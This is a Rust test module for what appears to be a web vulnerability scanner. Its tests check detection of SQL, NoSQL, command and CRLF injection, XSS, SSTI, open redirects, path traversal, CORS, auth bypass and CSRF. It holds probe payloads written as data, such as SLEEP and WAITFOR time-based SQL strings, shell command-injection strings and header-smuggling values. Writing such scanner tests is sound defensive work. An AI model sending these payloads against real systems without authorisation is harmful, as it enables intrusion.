    fn seen(status: u16, body: &str) -> Seen {
        Seen {
            status: Some(status),
            body: body.into(),
            content_type: Some("text/html".into()),
            location: None,
            headers: vec![],
        }
    }

    #[test]
    fn analysis_needs_a_real_difference() {
        let ps = probes(GET, &[], "pmX", 1000);
        let p = |c: &str, n: &str| ps.iter().find(|p| p.check == c && p.point.name == n).unwrap().clone();
        let base = seen(200, "ok");
        assert!(
            analyze(&p("sql_error", "q"), &base, &seen(500, "You have an error in your SQL syntax near"), "pmX")
                .is_some()
        );
        let noisy = seen(500, "SQLSTATE[42000] always here");
        assert!(analyze(&p("sql_error", "q"), &noisy, &noisy, "pmX").is_none(), "error was there already");
        assert!(analyze(&p("reflected_input", "q"), &base, &seen(200, "<p>pmX\"'<></p>"), "pmX").is_some());
        assert!(
            analyze(&p("reflected_input", "q"), &base, &seen(200, "<p>pmX&quot;&#39;&lt;&gt;</p>"), "pmX").is_none()
        );
        let mut json = seen(200, "{\"q\":\"pmX\\\"'<>\"}");
        json.content_type = Some("application/json".into());
        assert!(analyze(&p("reflected_input", "q"), &base, &json, "pmX").is_none(), "JSON isn't rendered");
        let mut r = seen(302, "");
        r.location = Some("https://pm-redirect.example/".into());
        assert!(analyze(&p("open_redirect", "next"), &base, &r, "pmX").is_some());
        r.location = Some("/home".into());
        assert!(analyze(&p("open_redirect", "next"), &base, &r, "pmX").is_none());
        assert!(
            analyze(&p("path_traversal", "file"), &base, &seen(200, "root:x:0:0:root:/root:/bin/bash"), "pmX")
                .is_some()
        );
        assert!(analyze(&p("ssti", "q"), &base, &seen(200, "Hello 1337"), "pmX").is_some());
        assert!(
            analyze(&p("ssti", "q"), &base, &seen(200, "Hello {{7*191}} 1337"), "pmX").is_none(),
            "echoed, not evaluated"
        );
    }

    #[test]
    fn cookies_and_headers_are_insertion_points() {
        let raw = "GET /p?id=1 HTTP/1.1\r\nHost: x\r\nUser-Agent: Mozilla/5.0\r\nCookie: sid=abc; theme=dark\r\nAccept: */*\r\n\r\n";
        let pts = points(raw);
        let kinds: Vec<(PointKind, &str)> = pts.iter().map(|p| (p.kind, p.name.as_str())).collect();
        assert_eq!(
            kinds,
            vec![
                (PointKind::Query, "id"),
                (PointKind::Header, "user-agent"),
                (PointKind::Cookie, "sid"),
                (PointKind::Cookie, "theme")
            ]
        );
        let ua = String::from_utf8(inject(raw, &pts[1], "x' AND SLEEP(3)-- -\r\nEvil: 1").unwrap()).unwrap();
        assert!(ua.contains("\r\nUser-Agent: x' AND SLEEP(3)-- -Evil: 1\r\nCookie: sid=abc; theme=dark\r\n"), "{ua}");
        let ck = String::from_utf8(inject(raw, &pts[3], "dark'").unwrap()).unwrap();
        assert!(ck.contains("\r\nCookie: sid=abc; theme=dark'\r\nAccept: */*\r\n\r\n"), "{ck}");
        // Headers and cookies get injection checks, not reflection or redirects.
        let ps = probes(raw, &[], "m", 1000);
        assert!(ps.iter().any(|p| p.point.kind == PointKind::Cookie && p.check == "sql_error"));
        assert!(ps.iter().any(|p| p.point.kind == PointKind::Header && p.check == "cmd_injection"));
        assert!(!ps.iter().any(|p| p.point.kind == PointKind::Header && p.check == "reflected_input"));
    }

    #[test]
    fn command_injection_needs_the_shell_to_compute() {
        let ps = probes(GET, &["cmd_injection".into()], "pmX", 1000);
        let p = ps.iter().find(|p| p.point.name == "q").unwrap();
        assert!(p.payload.starts_with("shoe;echo pmX$((7*191))"));
        let base = seen(200, "ok");
        assert!(analyze(p, &base, &seen(200, "PING shoe\npmX1337\n"), "pmX").is_some());
        assert!(
            analyze(p, &base, &seen(200, "you searched shoe;echo pmX$((7*191));"), "pmX").is_none(),
            "an echo of the input"
        );
    }

    #[test]
    fn boolean_verdicts() {
        let page =
            |rows: &str| seen(200, &format!("<html><h1>Results</h1><ul>{rows}</ul><footer>shop 2026</footer></html>"));
        let base = page("<li>Coffee</li><li>Tea</li>");
        let empty = page("");
        assert!(bool_differs(&base, &base, &base, &empty));
        assert!(!bool_differs(&base, &base, &empty, &empty), "both empty: the quote broke the query");
        assert!(!bool_differs(&base, &base, &base, &base), "no difference");
        let error = seen(500, "<html>error</html>");
        assert!(bool_differs(&base, &base, &base, &error), "the false condition fails differently");
        let other = page("<li>Cake</li><li>Bread</li><li>Wine</li><li>Milk</li>");
        assert!(!bool_differs(&base, &other, &base, &empty), "the page varies by itself");
        // Timestamps and counters don't count as differences.
        assert!(similarity("<p>Updated 1700000000 views 12</p>", "<p>Updated 1700000099 views 13</p>") > 0.99);
    }

    #[test]
    fn timing_and_payloads() {
        assert!(delayed(&[120, 100, 140], 3100, 3));
        assert!(!delayed(&[120, 100, 140], 1500, 3));
        assert!(timing_usable(&[100, 200]) && !timing_usable(&[100, 4000]) && !timing_usable(&[]));
        let ps = sql_time_probes("7");
        assert_eq!(ps[0].with_delay(3), "7 AND SLEEP(3)");
        assert!(ps.iter().any(|p| p.with_delay(0) == "7';WAITFOR DELAY '0:0:0'-- -"));
        let c = cmd_time_probes("x");
        assert_eq!(c[0].with_delay(4), "x;sleep 4;");
        assert!(c.iter().any(|p| p.with_delay(4) == "x&ping -n 5 127.0.0.1&"));
        let pairs = sql_bool_pairs("12");
        assert_eq!((pairs[0].context, pairs[0].falsy.as_str()), ("numeric", "12 AND 1=2"));
        assert_eq!(sql_bool_pairs("abc")[0].truthy, "abc' AND '1'='1");
    }

    fn seen_h(status: u16, body: &str, headers: &[(&str, &str)]) -> Seen {
        Seen {
            status: Some(status),
            body: body.into(),
            content_type: Some("text/html".into()),
            location: None,
            headers: headers.iter().map(|(a, b)| (a.to_string(), b.to_string())).collect(),
        }
    }

    #[test]
    fn error_families() {
        let ps = probes(GET, &["sql_error".into()], "pmX", 1000);
        let p = ps.iter().find(|p| p.point.name == "q").unwrap();
        let base = seen(200, "ok");
        let check = |body: &str| analyze(p, &base, &seen(500, body), "pmX").map(|i| i.check);
        assert_eq!(check("MongoServerError: unknown operator: $foo"), Some("nosql_error"));
        assert_eq!(check("javax.naming.directory.InvalidSearchFilterException: Bad search filter"), Some("ldap_error"));
        assert_eq!(check("lxml.etree.XPathEvalError: Invalid predicate"), Some("xpath_error"));
        assert_eq!(check("You have an error in your SQL syntax"), Some("sql_error"));
        assert_eq!(check("plain 500"), None);
        assert!(ps.iter().any(|p| p.payload.ends_with("*)(")), "LDAP breaker sent");
    }

    #[test]
    fn crlf_host_and_cors() {
        let raw = "GET /lang?set=en HTTP/1.1\r\nHost: shop.test\r\n\r\n";
        let ps = probes(raw, &["crlf".into()], "pmX", 1000);
        assert_eq!(ps.len(), 2);
        assert!(
            String::from_utf8_lossy(&ps[0].raw).starts_with("GET /lang?set=en%0D%0AX-PM-Injected%3A%20pmX HTTP/1.1")
        );
        let base = seen(302, "");
        assert!(analyze(&ps[0], &base, &seen_h(302, "", &[("x-pm-injected", "pmX")]), "pmX").is_some());
        assert!(
            analyze(&ps[0], &base, &seen_h(302, "", &[("set-cookie", "lang=en X-PM-Injected: pmX")]), "pmX").is_none()
        );

        let rp = request_probes(raw, &[], "pmX");
        let host = rp.iter().find(|p| p.payload == "Host: pmX.example").unwrap();
        assert!(String::from_utf8_lossy(&host.raw).contains("\r\nHost: pmX.example\r\n"));
        let xfh = rp.iter().find(|p| p.payload.starts_with("X-Forwarded-Host")).unwrap();
        assert!(String::from_utf8_lossy(&xfh.raw).contains("Host: shop.test\r\nX-Forwarded-Host: pmX.example\r\n\r\n"));
        let link = seen(200, "{\"link\":\"http://pmX.example/products/1\"}");
        assert!(analyze(host, &base, &link, "pmX").is_some());
        assert!(analyze(host, &base, &seen(200, "{\"link\":\"/products/1\"}"), "pmX").is_none());

        let cors: Vec<&Probe> = rp.iter().filter(|p| p.check == "cors").collect();
        assert_eq!(cors.len(), 4);
        assert!(cors.iter().any(|p| p.payload == "Origin: https://shop.test.pmX.example"));
        let any = cors.iter().find(|p| p.payload == "Origin: https://pmX.example").unwrap();
        let reflected = seen_h(
            200,
            "{}",
            &[("access-control-allow-origin", "https://pmX.example"), ("access-control-allow-credentials", "true")],
        );
        assert_eq!(analyze(any, &base, &reflected, "pmX").unwrap().severity, "high");
        assert!(analyze(any, &base, &seen_h(200, "{}", &[("access-control-allow-origin", "*")]), "pmX").is_none());
    }

    #[test]
    fn nosql_operators() {
        let json = "POST /login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"user\":\"al\",\"pw\":\"x\"}";
        let pw = points(json).into_iter().find(|p| p.name == "pw").unwrap();
        let n = nosql_probes(json, &pw, "m").unwrap();
        assert!(
            String::from_utf8_lossy(&n.ne).ends_with("{\"pw\":{\"$ne\":\"mzz\"},\"user\":\"al\"}")
                || String::from_utf8_lossy(&n.ne).ends_with("{\"user\":\"al\",\"pw\":{\"$ne\":\"mzz\"}}")
        );
        let q = points(GET).into_iter().next().unwrap();
        let n = nosql_probes(GET, &q, "m").unwrap();
        assert!(String::from_utf8_lossy(&n.ne).starts_with("GET /api/items/42?q[$ne]=mzz&next="));
        let denied = seen(401, "{\"error\":\"bad login\"}");
        let ok = seen(200, "{\"token\":\"abc\",\"user\":\"alice\"}");
        assert!(nosql_differs(&denied, &denied, &ok));
        assert!(!nosql_differs(&denied, &seen(400, "bad"), &ok), "$eq not understood like the plain value");
        assert!(!nosql_differs(&denied, &denied, &seen(500, "error")), "an error isn't a bypass");
    }

    #[test]
    fn auth_bypass_and_params() {
        let raw = "GET /admin/stats?x=1 HTTP/1.1\r\nHost: s\r\n\r\n";
        let v = auth_bypass_variants(raw, "m");
        assert!(v.iter().any(|(n, t, c)| n.starts_with("path: trailing slash")
            && String::from_utf8_lossy(t).starts_with("GET /admin/stats/?x=1 ")
            && String::from_utf8_lossy(c).starts_with("GET /pmm/?x=1 ")));
        assert!(v.iter().any(|(n, t, _)| n == "header: X-Original-URL: /admin/stats"
            && String::from_utf8_lossy(t).starts_with("GET / HTTP/1.1")));
        let denied = seen(403, "forbidden");
        let page = seen(200, "<h1>Stats</h1> users 12 orders 40");
        assert!(bypassed(&denied, &page, &seen(404, "not found")));
        assert!(!bypassed(&denied, &page, &page), "the trick reaches a catch-all page");
        assert!(!bypassed(&denied, &seen(200, "forbidden"), &seen(404, "x")));

        let r = with_params(GET, &["debug", "q", "role"], "pmV").unwrap();
        let r = String::from_utf8(r).unwrap();
        assert!(r.starts_with("GET /api/items/42?q=shoe&next=/home&file=report.pdf&debug=pmV0&role=pmV2 "), "{r}");
        let got = seen(200, "role is pmV2; debug pmV0x");
        assert_eq!(reflected_params(&["debug", "q", "role"], "pmV", &got), ["debug", "role"]);
        assert!(
            reflected_params(&["a", "b"], "pmV", &seen(200, "pmV10 pmV11")).is_empty(),
            "pmV1 is only a prefix there"
        );
        let base = seen(200, "<ul><li>a</li><li>b</li></ul>");
        assert!(differs(
            &base,
            &base,
            &seen(200, "<ul><li>a</li><li>b</li></ul><pre>internal: db=prod</pre><p>more debug data here</p>")
        ));
        assert!(!differs(&base, &base, &base));
    }

    #[test]
    fn dom_hooks_and_reports() {
        let js = dom_hooks("pmZ", "pmProof");
        assert!(js.contains("\"pmZ\"") && js.contains("innerHTML") && js.contains("\"pmProof\""));
        let calls = vec![
            r#"{"sink":"innerHTML","value":"Hi pmZ<pmx>"}"#.to_string(),
            r#"{"sink":"innerHTML","value":"Hi pmZ&lt;pmx&gt;"}"#.to_string(),
            r#"{"sink":"a.href","value":"/p?x=pmZ"}"#.to_string(),
            "junk".to_string(),
        ];
        let r = dom_reports(&calls, "pmZ");
        assert_eq!(r.len(), 3);
        assert!(dom_dangerous(&r[0].0, &r[0].1, "pmZ"));
        assert!(!dom_dangerous(&r[1].0, &r[1].1, "pmZ"));
        assert!(!dom_dangerous(&r[2].0, &r[2].1, "pmZ"));
        assert!(dom_dangerous("eval", "pmZ", "pmZ"));
        assert!(dom_dangerous("a.href", "javascript:pmZ", "pmZ"));
    }

    #[test]
    fn finds_same_origin_scripts() {
        let html = r#"<script src="/static/a.js"></script><SCRIPT SRC='b.js'></SCRIPT>
            <script src=https://cdn.example/c.js></script><script>inline()</script><script src="/static/a.js"></script>"#;
        assert_eq!(
            script_srcs(html, "http://shop.test:8080/app/page"),
            vec!["http://shop.test:8080/static/a.js", "http://shop.test:8080/app/b.js"]
        );
    }

    #[test]
    fn get_requests_keep_cookies_and_drop_the_body() {
        let form = "POST /api/x?a=1 HTTP/1.1\r\nHost: h\r\nCookie: s=1\r\nContent-Type: text/plain\r\nContent-Length: 3\r\n\r\nabc";
        let g = String::from_utf8(get_request(form, "/static/a.js").unwrap()).unwrap();
        assert_eq!(g, "GET /static/a.js HTTP/1.1\r\nHost: h\r\nCookie: s=1\r\n\r\n");
    }

    #[test]
    fn stored_values_are_told_apart() {
        let p = stored_payload("pmQ", 1);
        assert_eq!(stored_seen(&format!("<li>{p}</li>"), "pmQ", 1), Some(true));
        assert_eq!(stored_seen("<li>pmQs1&lt;pmx&gt;</li>", "pmQ", 1), Some(false));
        assert_eq!(stored_seen("<li>pmQs12<pmx></li>", "pmQ", 1), None);
    }

    #[test]
    fn csrf_candidates_and_verdict() {
        let form = "POST /api/profile HTTP/1.1\r\nHost: x\r\nCookie: sid=1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nemail=a%40b";
        let v = csrf_variants(form, "pmC");
        assert_eq!(v.len(), 1);
        let r = String::from_utf8(v[0].1.clone()).unwrap();
        assert!(r.contains("Origin: https://pmC.example") && r.contains("Referer: https://pmC.example/"));
        let json =
            "POST /a HTTP/1.1\r\nHost: x\r\nCookie: sid=1\r\nContent-Type: application/json\r\n\r\n{\"a\":\"b\"}";
        assert_eq!(csrf_variants(json, "pmC").len(), 2);
        assert!(csrf_variants(&form.replace("email=", "csrf_token=t&email="), "pmC").is_empty());
        assert!(csrf_variants(&form.replace("POST", "GET"), "pmC").is_empty());
        assert!(csrf_variants(&form.replace("Cookie: sid=1\r\n", ""), "pmC").is_empty());
        let ok = Seen { status: Some(200), body: "saved".into(), ..Default::default() };
        let denied = Seen { status: Some(403), body: "bad origin".into(), ..Default::default() };
        assert!(csrf_accepted(&ok, &ok.clone()));
        assert!(!csrf_accepted(&ok, &denied));
        let anon = String::from_utf8(without_header(form, "COOKIE").unwrap()).unwrap();
        assert!(!anon.contains("sid=1") && anon.contains("Host: x\r\nContent-Type:") && anon.ends_with("email=a%40b"));
    }

    #[test]
    fn base64_is_recognised_only_when_it_round_trips() {
        let (t, k) = b64_text("eyJ1c2VyIjoiYWxpY2UifQ==").unwrap();
        assert_eq!(t, "{\"user\":\"alice\"}");
        assert_eq!(b64_encode(t.as_bytes(), k), "eyJ1c2VyIjoiYWxpY2UifQ==");
        assert_eq!(b64_text("aGVsbG8gd29ybGQ").unwrap().0, "hello world");
        for plain in ["password", "abcdefgh", "12345678", "shoe", "report.pdf"] {
            assert!(b64_text(plain).is_none(), "{plain}");
        }
    }

    #[test]
    fn nested_xml_and_name_points() {
        let raw = "GET /a?data=%7B%22user%22%3A%22alice%22%7D&q=1 HTTP/1.1\r\nHost: x\r\n\
                   Cookie: prefs=eyJ1c2VyIjoiYWxpY2UifQ==\r\n\r\n";
        let pts = points(raw);
        let data = pts.iter().find(|p| p.name == "data.user").unwrap();
        assert_eq!((data.kind, data.original.as_str()), (PointKind::Nested, "alice"));
        let r = String::from_utf8(inject(raw, data, "x'").unwrap()).unwrap();
        assert!(r.starts_with("GET /a?data=%7B%22user%22%3A%22x%27%22%7D&q=1 "), "{r}");
        let prefs = pts.iter().find(|p| p.name == "prefs.user (base64)").unwrap();
        let r = String::from_utf8(inject(raw, prefs, "bob").unwrap()).unwrap();
        assert!(
            r.contains(&format!("prefs={}", b64_encode(b"{\"user\":\"bob\"}", B64 { url_safe: false, padded: true })))
        );

        let xml = "POST /import HTTP/1.1\r\nHost: x\r\nContent-Type: application/xml\r\n\r\n\
                   <?xml version=\"1.0\"?><items><item id=\"1\">Coffee</item><!-- c --><note/></items>";
        let pts = points(xml);
        assert_eq!(
            pts.iter().map(|p| (p.kind, p.name.as_str(), p.original.as_str())).collect::<Vec<_>>(),
            [(PointKind::Xml, "item", "Coffee")]
        );
        let r = String::from_utf8(inject(xml, &pts[0], "Tea'").unwrap()).unwrap();
        assert!(r.ends_with("<item id=\"1\">Tea'</item><!-- c --><note/></items>"), "{r}");

        let names = name_points(raw);
        assert_eq!(names.iter().map(|p| p.name.as_str()).collect::<Vec<_>>(), ["data", "q"]);
        let r = String::from_utf8(inject(raw, &names[1], "q'").unwrap()).unwrap();
        assert!(r.contains("&q%27=1 "), "{r}");
        // Names only get the quote and reflection probes.
        let checks: Vec<&str> =
            probes(raw, &[], "pmN", 1000).iter().filter(|p| p.point.kind == PointKind::Name).map(|p| p.check).collect();
        assert_eq!(checks, ["sql_error", "reflected_input", "sql_error", "reflected_input"]);
    }
}
